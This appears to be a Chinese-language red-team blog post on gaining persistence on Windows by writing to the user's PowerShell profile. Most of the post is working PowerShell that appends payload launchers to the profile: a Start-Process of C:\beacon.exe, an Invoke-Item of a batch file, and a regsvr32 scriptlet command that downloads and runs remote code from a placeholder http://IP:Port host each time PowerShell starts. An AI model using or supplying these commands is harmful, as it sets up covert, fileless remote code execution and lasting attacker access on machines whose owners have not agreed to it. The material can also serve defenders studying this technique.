---
title: Persistence PowerShell Profile
date: 2023-09-13T17:15:29+08:00
draft: false
url: /posts/2023-09-23/PowerShell-Profile
tags:
  - Windows
  - PowerShell-Profile
  - Persistence
---

## 0x00 前言

Persistence PowerShell Profile

## 0x01 PowerShell Profile

PowerShell 配置文件脚本存储在“ **WindowsPowerShell** ”文件夹中，默认情况下该文件夹对用户隐藏

如果有效负载已放入磁盘，则可以使用“ **Start-Process** ”cmdlet 来指向可执行文件的位置

使用 “ **Test-Path $profile** ” 确定当前用户是否存在配置文件

如果配置文件不存在，命令“ **New-Item -Path $profile -Type File -Force** ”将为当前用户创建配置文件，“ **Out-File** ”将使用新内容重写配置文件

```powershell
echo $profile
Test-Path $profile
New-Item -Path $profile -Type File –Force
$string = 'Start-Process "C:\beacon.exe"'
$string | Out-File -FilePath "C:\Users\administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

与启动进程类似，“ **Invoke-Item** ”cmdlet 可用于执行项目的默认操作，即运行文件、打开应用程序等

```powershell
echo $profile
Test-Path $profile
New-Item -Path $profile -Type File –Force
Add-Content $profile "Invoke-Item C:\launcher.bat"
$string | Out-File -FilePath "C:\Users\administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

“ **Invoke-Command** ”可以执行命令，regsvr32可以用作无文件上线，并且可以从远程位置执行 scriptlet

```powershell
echo $profile
Test-Path $profile
New-Item -Path $profile -Type File –Force
$string = 'Invoke-Command -ScriptBlock { regsvr32 /s /n /u /i:http://IP:Port/jWcEbr.sct scrobj.dll }'
$string | Out-File -FilePath "C:\Users\administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```
